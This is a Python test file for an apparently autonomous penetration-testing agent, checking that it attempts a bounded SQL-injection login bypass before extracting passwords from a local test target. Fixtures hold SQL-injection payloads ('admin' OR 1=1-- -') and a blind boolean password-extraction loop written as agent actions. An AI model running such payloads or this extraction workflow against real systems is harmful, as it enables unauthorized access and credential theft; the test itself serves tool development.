from __future__ import annotations

import json

from ravage.agent_core.agent_state import AgentState
from ravage.agent_core.frontier_auth_transition import (
    action_attempts_sql_auth_bypass,
    auth_bypass_matrix_attempted,
    detect_auth_transition_issue,
    remember_auth_bypass_matrix_attempt,
)
from ravage.agent_core.frontier_closure_obligation import (
    ClosureObligation,
    closure_obligation_from_observation,
)
from ravage.agent_core.frontier_contract_memory import (
    ContractRouteContext,
    remember_observed_request_contracts,
)

TARGET_URL = "http://127.0.0.1:8765"


def _state_with_login_contract() -> AgentState:
    state = AgentState()
    remember_observed_request_contracts(
        state,
        """
        $.ajax({
          type: 'post',
          url: 'index.php',
          data: {username: username, password: password, submit: 'submit'}
        });
        """,
        context=ContractRouteContext(
            target_url=TARGET_URL,
            family="sql_injection",
            objective_endpoint=TARGET_URL,
            objective_inputs=("username",),
        ),
    )
    return state


def _obligation() -> ClosureObligation:
    observation = json.dumps(
        {
            "findings": [
                {
                    "type": "sql_boolean_extraction_summary",
                    "extracted": [
                        {
                            "table": "users",
                            "column": "username",
                            "row": 0,
                            "value": "admin",
                        }
                    ],
                    "proofs": [],
                    "login_attempts": [],
                    "auth_bypass_attempts": [],
                }
            ]
        }
    )
    obligation = closure_obligation_from_observation(
        observation,
        family="sql_injection",
    )
    assert obligation is not None
    return obligation


def _extraction_action() -> dict[str, object]:
    return {
        "action": "run_python",
        "code": (
            "import urllib.request\n"
            "for position in range(1,33):\n"
            "    expr=f'ascii(substring((select password),{position},1))>64'\n"
            "    urllib.request.urlopen(login_url + '?username=' + expr)\n"
            "    print(prefix)"
        ),
    }


def _auth_bypass_action() -> dict[str, object]:
    return {
        "action": "run_python",
        "code": (
            "import requests\n"
            'payloads=["admin\' OR 1=1-- -", "x\')) OR 1=1-- -"]\n'
            "with requests.Session() as session:\n"
            "    for payload in payloads:\n"
            "        response=session.post(login_url, data={'username':'admin', "
            "'password':payload, 'submit':'submit'})\n"
            "        protected=session.get(dashboard_url)\n"
            "        print(response.text, protected.url)"
        ),
    }


def test_secret_extraction_is_gated_until_bounded_auth_bypass_is_attempted() -> None:
    state = _state_with_login_contract()
    obligation = _obligation()

    issue = detect_auth_transition_issue(
        state,
        obligation=obligation,
        action=_extraction_action(),
    )

    assert issue is not None
    assert issue.code == "bounded_auth_bypass_required_before_secret_extraction"


def test_successful_bounded_attempt_unlocks_secret_extraction_persistently() -> None:
    state = _state_with_login_contract()
    obligation = _obligation()
    action = _auth_bypass_action()

    assert action_attempts_sql_auth_bypass(action)
    assert remember_auth_bypass_matrix_attempt(
        state,
        obligation=obligation,
        action=action,
        observation=(
            'AUTH_CASE[password]=bounded-payload\nLOGIN_RESPONSE={"response":"password"}\n'
        ),
    )
    restored = AgentState.from_json(state.to_json())

    assert auth_bypass_matrix_attempted(restored, obligation)
    assert (
        detect_auth_transition_issue(
            restored,
            obligation=obligation,
            action=_extraction_action(),
        )
        is None
    )


def test_unbounded_auth_loop_does_not_unlock_extraction() -> None:
    action = _auth_bypass_action()
    action["code"] = str(action["code"]) + "\nwhile True: session.post(login_url)"

    assert not action_attempts_sql_auth_bypass(action)


def test_clean_exit_without_target_response_does_not_unlock_extraction() -> None:
    state = _state_with_login_contract()
    obligation = _obligation()

    assert not remember_auth_bypass_matrix_attempt(
        state,
        obligation=obligation,
        action=_auth_bypass_action(),
        observation=json.dumps({"stdout": "script started but emitted no response"}),
    )
    assert not auth_bypass_matrix_attempted(state, obligation)
